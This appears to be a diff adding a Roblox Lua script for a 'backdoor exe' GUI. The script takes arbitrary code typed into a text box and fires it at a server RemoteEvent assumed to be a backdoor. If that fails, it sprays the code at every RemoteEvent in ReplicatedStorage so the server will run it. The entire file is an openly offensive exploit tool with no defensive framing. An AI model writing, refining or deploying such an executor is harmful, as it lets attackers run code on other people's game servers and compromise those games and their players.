@@ -1,0 +1,32 @@
+local rs = game:GetService("ReplicatedStorage")
+local code = script.Parent.Parent:WaitForChild("TextBox").Text
+local button = script.Parent
+local ese = script.Parent.Parent.Parent:WaitForChild("backdoor exe")
+button.MouseButton1Click:Connect(function()
+ local box = ese:WaitForChild("TextBox")
+ local code = ese:WaitForChild("TextBox").Text
+
+ if code == "" or code == "-- Ready to execute" then
+  return
+ end
+
+ local rs = game:GetService("ReplicatedStorage")
+ local backdoor = rs:FindFirstChild("RemoteEvent")
+
+ local success = false
+ if backdoor and backdoor:IsA("RemoteEvent") then
+  success = pcall(function()
+   backdoor:FireServer(code)
+  end)
+ end
+
+ if not success then
+  for _, v in pairs(rs:GetChildren()) do
+   if v:IsA("RemoteEvent") then
+    task.spawn(function()
+     v:FireServer(code)
+    end)
+   end
+  end
+ end
+end)
